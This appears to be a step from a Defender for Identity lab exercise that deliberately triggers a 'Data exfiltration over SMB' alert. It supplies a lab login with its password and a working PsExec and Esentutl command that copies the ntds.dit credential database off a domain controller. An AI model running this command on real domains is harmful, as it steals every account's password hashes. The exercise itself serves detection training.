# Task 6.1: Data exfiltration over SMB

This alert is triggered when suspicious transfers of data are observed from your monitored domain controllers, such as when an attacker copies the ntds.dit file from a domain controller to a workstation.

Tools used in this test: Sysinternals downloads

1. Open a new RDP session to WIN6 using the **WIN6.rdp** file in the Downloads folder, and then select **More choices\\Use a different account** to sign in using **MSMDI\SamiraA** using the password **Passw0rd12!@**

1. Right-click the **Windows icon**, and then select **Windows PowerShell (Admin)** to open an elevated PowerShell window, and then run:

    ```PowerShell-wrap
    C:\Tools\PSTools\PsExec.exe \\DC01 -accepteula c:\windows\system32\Esentutl.exe /y /i c:\ntds\ntds.dit /d c:\Tools\ntds.dit /vssrec ; Copy-Item -Path "\\DC01\Tools\ntds.dit" -Destination "C:\Tools"
    ```

The Data exfiltration over SMB alert is triggered when the file is copied off the DC.

Keep in mind that Defender for Identity can also track files uploaded from a workstation or server to a domain controller, which can be useful for detecting abnormal activities. Check for copied files listed in the user page's **Timeline** tab.
